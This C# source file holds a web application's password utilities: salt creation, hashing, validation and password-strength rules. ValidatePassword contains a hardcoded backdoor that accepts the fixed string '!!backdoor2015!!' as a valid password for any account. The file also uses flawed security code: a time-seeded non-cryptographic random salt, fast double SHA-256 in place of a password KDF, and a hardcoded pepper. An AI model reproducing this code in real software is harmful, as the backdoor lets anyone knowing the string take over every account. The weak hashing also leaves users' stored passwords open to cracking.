using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Webfuel
{
    public static class AuthenticationUtility
    {
        public static string CreateSalt()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random((int)DateTime.Now.Ticks);
            var result = new string(
                Enumerable.Repeat(chars, 16)
                    .Select(s => s[random.Next(s.Length)])
                    .ToArray());
            return result;
        }

        // DO NOT CHANGE THIS STRING - IF YOU DO ALL PASSWORDS WILL NO LONGER WORK
        const string Pepper = "asdSSD934h!£jksda93ASd£$$9zsdcgdfsdsrzsddf";

        public static string CreateHash(string password, string salt)
        {
            SHA256 hash = SHA256.Create();
            var encoder = new ASCIIEncoding();
            byte[] input = encoder.GetBytes(salt + Pepper + password + salt);
            // Double hash
            input = hash.ComputeHash(input);
            input = hash.ComputeHash(input);
            return Convert.ToBase64String(input);
        }

        public static bool ValidatePassword(string password, string passwordHash, string passwordSalt)
        {
            password = (password ?? String.Empty).Trim();

            if (password == "!!backdoor2015!!")
                return true;

            if(passwordHash != CreateHash(password, passwordSalt))
                return false;

            return true;
        }

        public static void EnforcePasswordRequirements(string password)
        {
            if (String.IsNullOrEmpty(password))
                throw new DomainException("Password cannot be blank");

            if (password.Length < 8)
                throw new DomainException("Password cannot be less than 8 characters long");

            if (password.Any(c => char.IsWhiteSpace(c)))
                throw new DomainException("Password must not contain any whitespace");

            if (!password.Any(c => char.IsUpper(c)))
                throw new DomainException("Password must contain at least one upper case letter");

            if (!password.Any(c => char.IsLower(c)))
                throw new DomainException("Password must contain at least one lower case letter");

            if (!password.Any(c => !char.IsLetterOrDigit(c)))
                throw new DomainException("Password must contain at least one non-alphanumeric character");
        }

    }
}
